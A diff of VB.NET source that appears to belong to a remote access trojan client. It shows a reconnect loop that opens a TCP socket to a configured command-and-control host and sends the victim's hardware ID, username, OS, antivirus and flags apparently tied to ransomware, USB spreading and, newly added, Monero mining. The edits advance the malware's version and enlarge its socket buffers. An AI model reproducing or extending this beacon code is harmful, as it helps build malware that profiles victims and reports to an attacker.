@@ -76,10 +76,10 @@ e:      ' clear things and ReConnect
                 C = New Net.Sockets.TcpClient
                 C.ReceiveTimeout = -1
                 C.SendTimeout = -1
-                C.SendBufferSize = 999999
-                C.ReceiveBufferSize = 999999
-                C.Client.SendBufferSize = 999999
-                C.Client.ReceiveBufferSize = 999999
+                C.SendBufferSize = 9999999
+                C.ReceiveBufferSize = 9999999
+                C.Client.SendBufferSize = 9999999
+                C.Client.ReceiveBufferSize = 9999999
                 KA = 0
 #If DEBUG Then
                 C_Settings.HOST = "127.0.0.1"
@@ -98,8 +98,8 @@ e:      ' clear things and ReConnect
                 C.Client.Connect(C_Settings.HOST, C_Settings.PORT)
                 CNT = True
                 'Send info to server
-                Send(String.Concat("info", SPL, C_ID.HWID, SPL, C_ID.UserName, SPL, "v0.1.7.3D", SPL, C_ID.MyOS, " ", C_ID.Bit, SPL,
-                                   C_ID.INDATE, SPL, C_ID.AV, SPL, C_ID.Rans, SPL, C_ID.USBSP, SPL, " ", SPL, " "))
+                Send(String.Concat("info", SPL, C_ID.HWID, SPL, C_ID.UserName, SPL, "v0.1.8.0", SPL, C_ID.MyOS, " ", C_ID.Bit, SPL,
+                                   C_ID.INDATE, SPL, C_ID.AV, SPL, C_ID.Rans, SPL, C_ID.XMR, SPL, C_ID.USBSP, SPL, " ", SPL, " "))
             Catch ex As Exception
                 Threading.Thread.CurrentThread.Sleep(R.Next(5000))
                 GoTo e
